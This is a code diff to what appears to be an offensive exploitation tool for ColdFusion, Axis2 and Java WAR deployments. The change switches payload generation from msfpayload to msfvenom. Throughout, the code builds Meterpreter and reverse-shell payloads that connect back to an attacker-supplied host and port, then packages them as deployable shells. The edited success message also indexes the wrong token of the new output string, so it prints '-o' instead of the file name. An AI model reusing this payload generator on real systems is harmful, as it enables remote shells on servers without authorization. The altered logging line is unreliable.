@@ -23,24 +23,24 @@ def run(options):
         utility.Msg("Please specify a remote OS (-o)", LOG.ERROR)
         return
     elif options.remote_service in ["coldfusion"]:
-        out = "R > shell.jsp"
+        out = "-f raw -o shell.jsp"
     elif options.remote_service in ["axis2"]:
         PAYLOAD = "java/meterpreter/reverse_tcp"
-        out = "R > shell.jar"
+        out = "-f raw -o shell.jar"
     else:
-        out = "W > shell.war"
+        out = "-f war -o shell.war"
 
     if options.remote_os != "windows":
         SHELL = "/bin/bash"
 
-    if getoutput("which msfpayload") == "":
-        utility.Msg("This option requires msfpayload", LOG.ERROR)
+    if getoutput("which msfvenom") == "":
+        utility.Msg("This option requires msfvenom", LOG.ERROR)
         return
 
     utility.Msg("Generating payload....")
     (lhost, lport) = options.generate_payload.split(":")
 
-    resp = getoutput("msfpayload %s LHOST=%s LPORT=%s SHELL=%s %s" %
+    resp = getoutput("msfvenom -p %s LHOST=%s LPORT=%s SHELL=%s %s" %
                     (PAYLOAD, lhost, lport, SHELL, out))
 
     '''For axis2 payloads, we have to add a few things to the msfpayload output'''
@@ -66,7 +66,7 @@ def run(options):
             shellZip.write("./src/lib/axis2/PayloadServlet.class","metasploit/PayloadServlet.class")
             shellZip.writestr("META-INF/services.xml",services_xml)
 
-    if len(resp) <= 1 or 'Created by' in resp:
+    if len(resp) <= 1 or 'Saved as' in resp:
         utility.Msg("Payload generated (%s).  Payload: %s" % (out.split(' ')[2], PAYLOAD))
 
         # also log some auxiliary information
